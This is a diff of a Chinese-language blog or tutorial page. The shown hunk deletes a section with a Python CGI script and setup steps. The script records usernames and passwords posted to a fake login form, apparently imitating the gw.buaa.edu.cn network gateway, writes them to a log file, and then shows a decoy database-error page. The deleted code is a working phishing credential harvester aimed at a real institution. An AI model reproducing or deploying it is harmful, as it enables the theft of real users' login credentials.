@@ -437,28 +437,6 @@
  &lt;/form&gt;
 </code></pre>
     </div>
-
-    <p>编写后台处理程序，我用的是python的cgi，在/usr/lib/gci-bin下新建login.py：</p>
-
-    <div class="highlighter-rouge"><pre class="highlight"><code> #!/usr/bin/python
- #-*- encoding: utf-8 -*-
- import cgi, cgitb
- form = cgi.FieldStorage()
- username = form.getvalue('username')                # 获得用户名
- password = form.getvalue('password')                # 获得密码
- f = open('/cat/gw.buaa.edu.cn.log', 'a')            # 注意apache是否有所写文件夹的权限！！
- f.write("%s: %s\r\n" % (username, password))        # 将用户名和密码写入文件
- f.close()
- print "Content-type:text/html\r\n\r\n"              # 然后显示一个错误页面
- print '<span class="nt">&lt;html&gt;&lt;head&gt;</span>'
- print '<span class="nt">&lt;title&gt;</span>Error 126<span class="nt">&lt;/title&gt;</span>'
- print '<span class="nt">&lt;/head&gt;&lt;body&gt;</span>'
- print '<span class="nt">&lt;h1&gt;</span>Error establishing a database connection<span class="nt">&lt;/h1&gt;</span>'
- print '<span class="nt">&lt;/body&gt;&lt;/html&gt;</span>'
-</code></pre>
-    </div>
-
-    <p>将login.py的权限设置为755，即有运行权限</p>
   </li>
 </ol>
 
